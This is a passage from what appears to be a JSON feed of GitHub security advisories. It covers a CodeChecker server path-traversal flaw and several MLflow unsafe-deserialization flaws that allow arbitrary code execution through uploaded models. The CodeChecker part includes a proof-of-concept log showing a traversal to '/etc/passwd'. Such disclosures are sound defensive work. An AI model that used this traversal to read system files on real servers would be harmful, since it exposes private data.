[2043] &lt;139754026274816&gt; - mass_store_run.py:761 __add_or_update_run() - Storing analysis statistics done.\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:61 __enter__() - [poc] Store reports...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1163 __store_reports() - Get reports from '/home/discookie/.codechecker/tmpx7hg1teb/reports' directory\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1163 __store_reports() - Get reports from '/home/discookie/.codechecker/tmpx7hg1teb/reports/a7d0fa2d60d08ff39d519756917aaf43' directory\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1175 __store_reports() - Parsing input file 'sample.plist'\n[DEBUG][2023-10-25 14:30:31] {report-converter} [2043] &lt;139754026274816&gt; - hash.py:208 get_report_path_hash() - 2|12|Path traversal|/etc/passwdcore.DivideZero3d3a7db6520247eaf90719a53d7103e2\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:987 __process_report_file() - Storing report to the database...\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:827 __add_report_context() - Storing bug path positions.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:834 __add_report_context() - Storing bug path events.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:842 __add_report_context() - Storing notes.\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:853 __add_report_context() - Storing macro expansions.\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1220 __store_reports() - [poc] Processed 1 analyzer result file(s).\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:64 __exit__() - [poc] Store reports done... (duration: 0.1 sec)\n[DEBUG][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1260 finish_checker_run() - Finishing checker run\n[INFO][2023-10-25 14:30:31] {server} [2043] &lt;139754026274816&gt; - mass_store_run.py:1397 store() - 'Anonymous' stored results (3 KB /decompressed/) to run 'poc' (id: 16)  in 0.15 seconds.\n[INFO][2023-10-25 14:30:31] {store_time} [2043] &lt;139754026274816&gt; - mass_store_run.py:1414 store() - 2023-10-25T14:30:31.612326, 0.15s, \"Default\", \"poc\", 3KB, 1, 16\n[DEBUG][2023-10-25 14:30:31] {profiler} [2043] &lt;139754026274816&gt; - profiler.py:59 debug_wrapper() - [0.173351s] massStoreRun\n</code></pre>\n</details>\n\n<h2 id=\"impact\">Impact</h2>\n<p>The path traversal vulnerability allows reading data on the machine of the <code>CodeChecker server</code>, with the same permission level as the <code>CodeChecker server</code> process. This allows for the exfiltration from the server-side storage medium.\nIf the <code>CodeChecker server</code> is run with authentication enabled (not the default configuration), then the attack requires a valid user account on the <code>CodeChecker server</code>, with the permission to store to a database, and view the stored reports.</p>\n<p>CVSS 3.1 Base Score: 6.5\n<a href=\"https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&amp;version=3.1\">AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</a></p>\n<p>Reproducible up to version <code>6.22.1</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Ericsson/codechecker/security/advisories/GHSA-h26w-r4m5-8rrf\">https://github.com/Ericsson/codechecker/security/advisories/GHSA-h26w-r4m5-8rrf</a></li>\n<li><a href=\"https://github.com/Ericsson/codechecker/commit/46bada41e32f3ba0f6011d5c556b579f6dddf07a\">https://github.com/Ericsson/codechecker/commit/46bada41e32f3ba0f6011d5c556b579f6dddf07a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49793\">https://nvd.nist.gov/vuln/detail/CVE-2023-49793</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/codechecker/PYSEC-2024-54.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/codechecker/PYSEC-2024-54.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h26w-r4m5-8rrf\">https://github.com/advisories/GHSA-h26w-r4m5-8rrf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h26w-r4m5-8rrf",
            "title": "[codechecker] CodeChecker has a Path traversal in `CodeChecker server` in the endpoint of `CodeChecker store`",
            "date_modified": "2024-06-26T21:56:27.000Z",
            "date_published": "2024-06-24T16:18:09.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h26w-r4m5-8rrf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 2.0.0rc0 or newer, enabling a maliciously uploaded Tensorflow model to run arbitrary code on an end user’s system when interacted with.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37057\">https://nvd.nist.gov/vuln/detail/CVE-2024-37057</a></li>\n<li><a href=\"https://hiddenlayer.com/sai-security-advisory/mlflow-june2024\">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j8mg-pqc5-x9gj\">https://github.com/advisories/GHSA-j8mg-pqc5-x9gj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j8mg-pqc5-x9gj",
            "title": "[mlflow] MLFlow unsafe deserialization",
            "date_modified": "2024-06-21T14:37:20.000Z",
            "date_published": "2024-06-04T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j8mg-pqc5-x9gj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.24.0 or newer, enabling a maliciously uploaded pmdarima model to run arbitrary code on an end user’s system when interacted with.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37055\">https://nvd.nist.gov/vuln/detail/CVE-2024-37055</a></li>\n<li><a href=\"https://hiddenlayer.com/sai-security-advisory/mlflow-june2024\">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x38x-g6gr-jqff\">https://github.com/advisories/GHSA-x38x-g6gr-jqff</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x38x-g6gr-jqff",
            "title": "[mlflow] MLFlow unsafe deserialization",
            "date_modified": "2024-06-21T14:36:58.000Z",
            "date_published": "2024-06-04T12:31:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x38x-g6gr-jqff"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 2.5.0 or newer, enabling a maliciously uploaded Langchain AgentExecutor model to run arbitrary code on an end user’s system when interacted with.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37058\">https://nvd.nist.gov/vuln/detail/CVE-2024-37058</a></li>\n<li><a href=\"https://hiddenlayer.com/sai-security-advisory/mlflow-june2024\">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cwgg-w6mp-w9hg\">https://github.com/advisories/GHSA-cwgg-w6mp-w9hg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cwgg-w6mp-w9hg",
            "title": "[mlflow] MLFlow unsafe deserialization",
            "date_modified": "2024-06-21T14:36:38.000Z",
            "date_published": "2024-06-04T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cwgg-w6mp-w9hg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.23.0 or newer, enabling a maliciously uploaded LightGBM scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37056\">https://nvd.nist.gov/vuln/detail/CVE-2024-37056</a></li>\n<li><a href=\"https://hiddenlayer.com/sai-security-advisory/mlflow-june2024\">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7p8j-qv6x-f4g4\">https://github.com/advisories/GHSA-7p8j-qv6x-f4g4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7p8j-qv6x-f4g4",
            "title": "[mlflow] MLFlow unsafe deserialization",
            "date_modified": "2024-06-21T14:35:06.000Z",
            "date_published": "2024-06-04T12:31:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7p8j-qv6x-f4g4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.1.0 or newer, enabling a maliciously uploaded scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37053\">https://nvd.nist.gov/vuln/detail/CVE-2024-37053</a></li>\n<li><a href=\"https://hiddenlayer.com/sai-security-advisory/mlflow-june2024\">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-43c4-9qgj-x742\">https://github.com/advisories/GHSA-43c4-9qgj-x742</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-43c4-9qgj-x742",
            "title": "[mlflow] MLFlow unsafe deserialization",
            "date_modified": "2024-06-21T14:34:45.000Z",
            "date_published": "2024-06-04T12:31:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-43c4-9qgj-x742"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.1.0 or newer, enabling a maliciously uploaded scikit-learn model to run arbitrary code on an end user’s system when interacted with.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37052\">https://nvd.nist.gov/vuln/detail/CVE-2024-37052</a></li>\n<li><a href=\"https://hiddenlayer.com/sai-security-advisory/mlflow-june2024\">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-76cg-cfhx-373f\">https://github.com/advisories/GHSA-76cg-cfhx-373f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-76cg-cfhx-373f",
            "title": "[mlflow] MLFlow unsafe deserialization",
            "date_modified": "2024-06-21T14:34:14.000Z",
            "date_published": "2024-06-04T12:31:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-76cg-cfhx-373f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Deserialization of untrusted data can occur in versions of the MLflow platform running version 1.27.0 or newer, enabling a maliciously crafted Recipe to execute arbitrary code on an end user’s system when run.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-37060\">https://nvd.nist.gov/vuln/detail/CVE-2024-37060</a></li>\n<li><a href=\"https://hiddenlayer.com/sai-security-advisory/mlflow-june2024\">https://hiddenlayer.com/sai-security-advisory/mlflow-june2024</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cv6c-7963-wxcg\">https://github.com/advisories/GHSA-cv6c-7963-wxcg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cv6c-7963-wxcg",
            "title": "[mlflow] MLFlow unsafe deserialization",
            "date_modified": "2024-06-21T14:33:53.000Z",
            "date_published": "2024-06-04T12:31:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cv6c-7963-wxcg"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}